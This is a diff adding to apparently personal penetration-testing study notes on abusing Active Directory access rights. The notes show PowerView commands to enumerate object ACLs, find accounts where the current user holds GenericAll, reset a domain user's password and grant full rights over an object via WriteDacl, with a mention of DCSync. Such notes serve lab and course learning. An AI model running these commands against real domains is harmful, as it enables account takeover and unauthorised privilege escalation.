@@ -14,3 +14,37 @@ The ACE is stored arccording to the Secutiry Descriptor Definition Language(SDDL
 (A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)
 ```
 We can reference the [microsoft doc](https://docs.microsoft.com/en-us/windows/win32/secauthz/generic-access-rights) to read/understand the access rights
+
+we cab enumernate the AD OBJ with Get-ObjectAcl, the foreach resolve the SID through ConvertFrom-SID
+
+```
+PS C:\tools> Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
+```
+
+#### Generuic All abuse
+
+import powerview
+```
+PS C:\tools> . .\powerview.ps1
+```
+
+The GenericAll access right, which gives full control of the targeted object. 
+
+We can get enumerate all domain users that our current account has GenericAll rights to it, or we can replace **Get-DomainGroup** to find a group 
+
+```
+PS C:\tools> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
+$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+if we found an account that we have access to it, we can update the password, we can do the samething with **ForceChangePassword** and **AllExtendedRights** access rights to change the password of a user account in a similar way without supplying the old password.
+```
+PS C:\tools> net user testservice1 pass /domain
+```
+
+if our user has **WriteDacl** permission to a AD object, we can use Add-DomainObjectAcl PowerView method to apply additional access rights
+such as GenericAll, GenericWrite, or even DCSync if the targeted object is the domain object
+
+```
+PS C:\tools> Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+```
